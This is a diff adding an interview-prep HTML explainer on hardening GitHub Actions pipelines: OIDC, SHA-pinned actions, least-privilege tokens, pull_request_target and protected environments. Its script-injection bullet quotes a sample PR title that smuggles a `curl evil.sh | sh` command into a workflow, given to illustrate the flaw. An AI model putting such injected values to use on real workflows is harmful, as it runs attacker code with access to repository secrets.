@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>devops-102 · How do you secure GitHub Actions pipelines?</title>
+<link rel="stylesheet" href="explain.css">
+</head>
+<body>
+<!-- InterviewPro "Read in detail" answer. Edit freely: keep the <article data-id> and the h2 section names. -->
+<article class="ex-md" data-id="devops-102" data-topic="CI/CD Tools">
+<h1>How do you secure GitHub Actions pipelines?</h1>
+<p class="ex-meta">CI/CD Tools · concept · levels mid, senior</p>
+
+<h2>In one line</h2>
+<p>Secure GitHub Actions with <strong>OIDC</strong> instead of stored cloud keys, <strong>pin third-party actions to full commit SHAs</strong>, <strong>least-privilege <code>GITHUB_TOKEN</code> permissions</strong>, careful use of <strong><code>pull_request_target</code></strong> and <strong>no direct interpolation of untrusted input</strong> into scripts, plus <strong>environment protection</strong> and <strong>scoped secrets</strong>.</p>
+
+<h2>Detailed explanation</h2>
+<p>A CI pipeline holds the keys to production, so it is a prime supply-chain target.</p>
+<p><strong>OIDC instead of long-lived keys:</strong> with <code>permissions: id-token: write</code>, a workflow requests a signed OIDC token from GitHub and exchanges it with AWS, Azure or GCP for <strong>short-lived credentials</strong>. The cloud trust policy restricts <strong>which repo, branch or environment</strong> may assume the role (via the <code>sub</code> claim). No static access keys exist to leak.</p>
+<p><strong>Pin actions to SHAs:</strong> tags like <code>@v4</code> are mutable; an attacker who compromises an action's repository can move the tag to malicious code. This happened with <strong><code>tj-actions/changed-files</code> in March 2025</strong>, where altered tags exposed secrets in many repositories' logs. Pin to a <strong>full commit SHA</strong> (with a version comment) and let <strong>Dependabot</strong> or Renovate update it. Restrict allowed actions at org level.</p>
+<p><strong>Least-privilege <code>GITHUB_TOKEN</code>:</strong> set the org/repo default to <strong>read-only</strong> and declare <code>permissions:</code> per workflow or job, granting only what is needed (for example <code>contents: read</code>, <code>pull-requests: write</code>).</p>
+<p><strong>Untrusted code and input:</strong></p>
+<ul>
+  <li><code>pull_request</code> from forks runs <strong>without secrets</strong> and with a read-only token, which is safe. <strong><code>pull_request_target</code></strong> runs in the base repo context <strong>with secrets</strong>; never check out and execute the fork's code in it.</li>
+  <li><strong>Script injection:</strong> expressions like <code>${{ github.event.pull_request.title }}</code> inside <code>run:</code> are substituted before the shell runs, so a PR title such as <code>&quot;; curl evil.sh | sh #</code> executes. Pass untrusted values through <strong>environment variables</strong> and quote them.</li>
+</ul>
+<p><strong>Environments and secrets:</strong> production secrets live in a <strong>protected environment</strong> with <strong>required reviewers</strong> and branch restrictions, so only approved runs on <code>main</code> can access them. Avoid organisation-wide secrets with broad scope.</p>
+<p><strong>Runners:</strong> never use <strong>self-hosted runners on public repositories</strong>; use ephemeral, isolated runners. Add <strong>CodeQL</strong>, secret scanning, dependency review, and <strong>artifact attestations</strong> for provenance.</p>
+
+<h2>How it works</h2>
+<ol>
+  <li>Default token read-only; per-job permissions.</li>
+  <li>Cloud roles trust GitHub OIDC with tight subject conditions.</li>
+  <li>All third-party actions pinned to SHAs, updated by Dependabot.</li>
+  <li>Untrusted input passed via env vars only.</li>
+  <li>Production jobs use protected environments.</li>
+  <li>Audit logs and scanning monitor the pipeline.</li>
+</ol>
+
+<h2>Example</h2>
+<pre><code class="language-yaml">permissions: { contents: read }
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    environment: production
+    permissions: { contents: read, id-token: write }
+    steps:
+      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
+      - uses: aws-actions/configure-aws-credentials@&lt;full-sha&gt; # v4
+        with:
+          role-to-assume: arn:aws:iam::123456789012:role/gh-deploy-prod
+          aws-region: eu-west-1
+      - name: Safe use of untrusted input
+        env: { PR_TITLE: &quot;${{ github.event.pull_request.title }}&quot; }
+        run: echo &quot;Title: $PR_TITLE&quot;</code></pre>
+
+<h2>Common mistakes</h2>
+<ul>
+  <li>Storing cloud access keys as repository secrets.</li>
+  <li><code>pull_request_target</code> workflows that check out and build fork code.</li>
+  <li>Write-all default token permissions.</li>
+  <li>Self-hosted runners on public repos.</li>
+</ul>
+
+<h2>How to answer in the interview</h2>
+<p>&quot;I use OIDC federation to the cloud so workflows get short-lived credentials and no long-lived keys are stored. Third-party actions are pinned to full commit SHAs, because tags can be moved, as the tj-actions compromise showed, with Dependabot keeping them updated. The GITHUB_TOKEN is read-only by default and permissions are declared per job. I'm careful with pull_request_target and never interpolate untrusted input like PR titles directly into shell scripts; I pass it through environment variables. Production deploys use protected environments with required reviewers and environment secrets.&quot;</p>
+
+<h2>Likely follow-up questions</h2>
+<ul>
+  <li><strong>Why are self-hosted runners on public repos dangerous?</strong> Anyone can open a PR that runs code on your machine and persists on it.</li>
+  <li><strong>How to restrict OIDC trust?</strong> Match <code>sub</code> to the repo and environment, e.g. <code>repo:acme/app:environment:production</code>.</li>
+  <li><strong>How to detect leaked secrets?</strong> Secret scanning with push protection and rotating anything exposed.</li>
+</ul>
+</article>
+</body>
+</html>
